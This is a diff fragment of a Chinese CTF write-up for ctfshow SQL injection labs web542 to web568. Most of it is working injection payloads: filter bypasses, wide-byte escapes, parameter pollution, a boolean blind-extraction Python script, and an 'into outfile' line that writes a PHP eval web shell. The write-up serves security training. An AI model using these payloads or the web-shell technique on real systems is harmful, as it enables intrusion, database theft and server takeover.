+</code></pre>
+<pre><code>%27aandnd%20updatexml(1,concat(0x3d,(select%20right(flag4s,20)%20from%20ctfshow.flags)),1)--+
+</code></pre>
+<h2 id="web542">web542</h2>
+<p>不能使用报错注入，但是有回显，使用union注入。<br>
+还是同样的双写绕过过滤。</p>
+<pre><code>-1%20union%20select%201,2,group_concat(table_name)%20from%20infoorrmation_schema.tables where table_schema='ctfshow'%23
+</code></pre>
+<pre><code>-1%20union%20select%201,2,group_concat(column_name)%20from%20infoorrmation_schema.columns where table_schema='ctfshow'%23
+</code></pre>
+<pre><code>-1%20union%20select%201,2,group_concat(flag4s)%20from%20ctfshow.flags%23
+</code></pre>
+<h2 id="web543">web543</h2>
+<p>过滤了空格和注释符</p>
+<p>绕过空格方式：</p>
+<pre><code>%09 TAB 键（水平）
+%0a 新建一行
+%0c 新的一页
+%0d return 功能
+%0b TAB 键（垂直）
+%a0 空格
+</code></pre>
+<p>这里用括号的方式，和<code>||</code>代替or来绕过。</p>
+<p>注释符都被过滤掉了，最后的引号我们需要闭合。</p>
+<pre><code>999%27||updatexml(1,concat(0x7e,(select((flag4s))from(ctfshow.flags)),0x7e),1)||%27
+</code></pre>
+<pre><code>999%27||updatexml(1,concat(0x7e,(select(right(flag4s,20))from(ctfshow.flags)),0x7e),1)||%27
+</code></pre>
+<h2 id="web544">web544</h2>
+<p><code>')</code>闭合<br>
+没有报错信息<br>
+使用上题方法，改为布尔盲注。</p>
+<pre><code class="language-py">import requests
+
+url = &quot;http://6ec46794-6350-449e-8a3b-361aac041abf.challenge.ctf.show/&quot;
+
+result = ''
+i = 0
+
+while True:
+    i = i + 1
+    head = 32
+    tail = 127
+
+    while head &lt; tail:
+        mid = (head + tail) &gt;&gt; 1
+        # payload = f'if(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},1,0)'
+        # payload = f'if(ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},1,0)'
+        payload = f'if(ascii(substr((select(group_concat(flag4s))from(ctfshow.flags)),{i},1))&gt;{mid},1,0)'
+        data = {
+            'id': f&quot;999')||{payload}||('0&quot;
+        }
+        r = requests.get(url,params=data)
+        if &quot;Dumb&quot; in r.text:
+            head = mid + 1
+        else:
+            tail = mid
+
+    if head != 32:
+        result += chr(head)
+    else:
+        break
+    print(result)
+</code></pre>
+<h2 id="web545">web545</h2>
+<p>过滤了select,union,空格</p>
+<pre><code class="language-php">&lt;?php
+function blacklist($id)
+{
+$id= preg_replace('/[\/\*]/',&quot;&quot;, $id);		//strip out /*
+$id= preg_replace('/[--]/',&quot;&quot;, $id);		//Strip out --.
+$id= preg_replace('/[#]/',&quot;&quot;, $id);			//Strip out #.
+$id= preg_replace('/[ +]/',&quot;&quot;, $id);	    //Strip out spaces.
+$id= preg_replace('/select/m',&quot;&quot;, $id);	    //Strip out spaces.
+$id= preg_replace('/[ +]/',&quot;&quot;, $id);	    //Strip out spaces.
+$id= preg_replace('/union/s',&quot;&quot;, $id);	    //Strip out union
+$id= preg_replace('/select/s',&quot;&quot;, $id);	    //Strip out select
+$id= preg_replace('/UNION/s',&quot;&quot;, $id);	    //Strip out UNION
+$id= preg_replace('/SELECT/s',&quot;&quot;, $id);	    //Strip out SELECT
+$id= preg_replace('/Union/s',&quot;&quot;, $id);	    //Strip out Union
+$id= preg_replace('/Select/s',&quot;&quot;, $id);	    //Strip out select
+return $id;
+}
+</code></pre>
+<p>过滤了许多，但还是可以用重写的方式来绕过<br>
+因为select过滤了两次，需要多套一层。</p>
+<p>报错注入</p>
+<pre><code>%27and%0aupdatexml(1,concat(0x3d,(seselselectectlect%0agroup_concat(schema_name)%0afrom%0ainformation_schema.schemata)),1)and%27
+</code></pre>
+<p>直接使用union注入也行</p>
+<pre><code>999%27%0auunionnion%0aseseselectlectlect%0a1,(seleseselectlectct%0aflag4s%0afrom%0actfshow.flags),%273
+</code></pre>
+<h2 id="web546">web546</h2>
+<p>同上题，<code>&quot;</code>闭合</p>
+<pre><code>999&quot;%0auunionnion%0aseseselectlectlect%0a1,(seleseselectlectct%0aflag4s%0afrom%0actfshow.flags),&quot;3
+</code></pre>
+<h2 id="web547">web547</h2>
+<p><code>')</code>闭合，更改了过滤规则。</p>
+<pre><code class="language-php">&lt;?php
+function blacklist($id)
+{
+$id= preg_replace('/[\/\*]/',&quot;&quot;, $id);				//strip out /*
+$id= preg_replace('/[--]/',&quot;&quot;, $id);				//Strip out --.
+$id= preg_replace('/[#]/',&quot;&quot;, $id);					//Strip out #.
+$id= preg_replace('/[ +]/',&quot;&quot;, $id);	    		//Strip out spaces.
+//$id= preg_replace('/select/m',&quot;&quot;, $id);	   		 	//Strip out spaces.
+$id= preg_replace('/[ +]/',&quot;&quot;, $id);	    		//Strip out spaces.
+$id= preg_replace('/union\s+select/i',&quot;&quot;, $id);	    //Strip out UNION &amp; SELECT.
+return $id;
+}
+</code></pre>
+<p>过滤了union\s+select，同样使用重写的方式。</p>
+<pre><code>999%27)%0aunion%0aunion%0aselectselect%0a1,(select%0aflag4s%0afrom%0actfshow.flags),(%273
+</code></pre>
+<h2 id="web548">web548</h2>
+<p>同上</p>
+<h2 id="web549">web549</h2>
+<p>提示有waf<br>
+分析下代码</p>
+<pre><code class="language-php">&lt;?php
+//including the Mysql connect parameters.
+include(&quot;../sql-connections/sql-connect.php&quot;);
+//disable error reporting
+error_reporting(0);
+
+// take the variables 
+if(isset($_GET['id']))
+{
+	$qs = $_SERVER['QUERY_STRING'];
+	$hint=$qs;
+	$id1=java_implimentation($qs);
+	$id=$_GET['id'];
+	//echo $id1;
+	whitelist($id1);
+	
+	//logging the connection parameters to a file for analysis.
+	$fp=fopen('result.txt','a');
+	fwrite($fp,'ID:'.$id.&quot;\n&quot;);
+	fclose($fp);
+// connectivity 
+	$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
+	$result=mysql_query($sql);
+	$row = mysql_fetch_array($result);
+	if($row)
+	{
+	  	echo &quot;&lt;font size='5' color= '#99FF00'&gt;&quot;;	
+	  	echo 'Your Login name:'. $row['username'];
+	  	echo &quot;&lt;br&gt;&quot;;
+	  	echo 'Your Password:' .$row['password'];
+	  	echo &quot;&lt;/font&gt;&quot;;
+  	}
+	else 
+	{
+		echo '&lt;font color= &quot;#FFFF00&quot;&gt;';
+		print_r(mysql_error());
+		echo &quot;&lt;/font&gt;&quot;;  
+	}
+}
+	else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
+//WAF implimentation with a whitelist approach..... only allows input to be Numeric.
+function whitelist($input)
+{
+	$match = preg_match(&quot;/^\d+$/&quot;, $input);
+	if($match)
+	{
+		//echo &quot;you are good&quot;;
+		//return $match;
+	}
+	else
+	{	
+		header('Location: hacked.php');
+		//echo &quot;you are bad&quot;;
+	}
+}
+
+// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).
+function java_implimentation($query_string)
+{
+	$q_s = $query_string;
+	$qs_array= explode(&quot;&amp;&quot;,$q_s);
+
+
+	foreach($qs_array as $key =&gt; $value)
+	{
+		$val=substr($value,0,2);
+		if($val==&quot;id&quot;)
+		{
+			$id_value=substr($value,3,30); 
+			return $id_value;
+			echo &quot;&lt;br&gt;&quot;;
+			break;
+		}
+
+	}
+
+}
+</code></pre>
+<p>发现会对id1进行检查，必须为数字，这里没法绕过，但是传入sql语句的是id，这里id1是获取第一个为id的参数，但是<code>$_GET['id']</code>，会获取最后一个id参数的值。</p>
+<pre><code>?id=1&amp;id=-1%27%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
+</code></pre>
+<h2 id="web550">web550</h2>
+<p>同上，<code>&quot;</code>闭合</p>
+<pre><code>?id=1&amp;id=-1&quot;%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
+</code></pre>
+<h2 id="web551">web551</h2>
+<p>同上，<code>&quot;)</code>闭合</p>
+<pre><code>?id=1&amp;id=-1&quot;)%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
+</code></pre>
+<h2 id="web552">web552</h2>
+<p>绕过转义函数addslashes<br>
+宽字节注入。</p>
+<p>mysql有一个特性就是在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）</p>
+<pre><code>%df%27%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
+</code></pre>
+<h2 id="web553">web553</h2>
+<p>同上</p>
+<h2 id="web554">web554</h2>
+<p>也是宽字节注入</p>
+<pre><code>uname=%df%27%20union%20select%201,(select%20flag4s%20from%20ctfshow.flags)--+&amp;passwd=&amp;submit=Submit
+</code></pre>
+<h2 id="web555">web555</h2>
+<p>这里没有引号，不需要绕过addslashes，直接注入就行。</p>
+<pre><code>-1%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
+</code></pre>
+<h2 id="web556">web556</h2>
+<p>这里改用了mysql_real_escape_string函数</p>
+<p>但是需要在执行sql语句之前调用一下mysql_set_charset函数，设置当前连接的字符集为gbk。才可以完美的防御</p>
+<p>同样使用宽字节注入</p>
+<pre><code>%df%27%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
+</code></pre>
+<h2 id="web557">web557</h2>
+<pre><code>uname=%df%27%20union%20select%201,(select%20flag4s%20from%20ctfshow.flags)--+&amp;passwd=123&amp;submit=Submit
+</code></pre>
+<h2 id="web558">web558</h2>
+<p>用了mysqli_multi_query函数，可以使用堆叠注入，但是union注入也可以。</p>
+<pre><code>-1%27%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
+</code></pre>
+<h2 id="web559">web559</h2>
+<p>同上</p>
+<pre><code>-1%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
+</code></pre>
+<h2 id="web560">web560</h2>
+<p>同上</p>
+<pre><code>-1%27)union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
+</code></pre>
+<h2 id="web561">web561</h2>
+<p>同上</p>
+<pre><code>-1%20union%20select%201,2,(select%20flag4s%20from%20ctfshow.flags)--+
+</code></pre>
+<h2 id="web562">web562</h2>
+<p>username处做了过滤，在passwd处注入。</p>
+<pre><code>login_user=123&amp;login_password=-1%20%27union%20select%201,(select%20flag4s%20from%20ctfshow.flags),3--+&amp;mysubmit=Login
+</code></pre>
+<h2 id="web563">web563</h2>
+<p>同上，<code>')</code>闭合</p>
+<pre><code>login_user=132&amp;login_password=-1%20%27)union%20select%201,(select%20flag4s%20from%20ctfshow.flags),3--+&amp;mysubmit=Login
+</code></pre>
+<h2 id="web564">web564</h2>
+<p>order by类型注入</p>
+<p>报错注入</p>
+<pre><code>?sort=updatexml(0,(select%20flag4s%20from%20ctfshow.flags),1)
+</code></pre>
+<pre><code>?sort=updatexml(0,(select%20right(flag4s,20)%20from%20ctfshow.flags),1)
+</code></pre>
+<h2 id="web565">web565</h2>
+<p>同上，<code>'</code>闭合</p>
+<pre><code>?sort=%27%20and%20updatexml(0,(select%20flag4s%20from%20ctfshow.flags),1)--+
+</code></pre>
+<pre><code>?sort=%27%20and%20updatexml(0,(select%20right(flag4s,20)%20from%20ctfshow.flags),1)--+
+</code></pre>
+<h2 id="web566">web566</h2>
+<p>同上，但没有报错输出了<br>
+使用盲注的方式</p>
+<p>这里还能用into outfile写shell的方式。</p>
+<pre><code>?sort=1 into outfile &quot;/var/www/html/1.php&quot;lines terminated by 0x3c3f706870206576616c28245f504f53545b315d293b3f3e2020--+
+</code></pre>
+<p>写php脚本来查询</p>
+<pre><code class="language-php">&lt;?php
+$q=@mysql_query(&quot;select flag4s from ctfshow.flags&quot;);while($rs=@mysql_fetch_row($q)){echo(&quot; (&quot;.$rs[0].&quot;)&quot;);}
+</code></pre>
+<h2 id="web567">web567</h2>
+<p>同上</p>
+<h2 id="web568">web568</h2>
+<p>同上，<code>'</code>闭合</p>
+<h2 id="参考文章">参考文章</h2>
+<p>https://blog.csdn.net/solitudi/article/details/115534124</p>
+]]></content>
+    </entry>
+</feed>
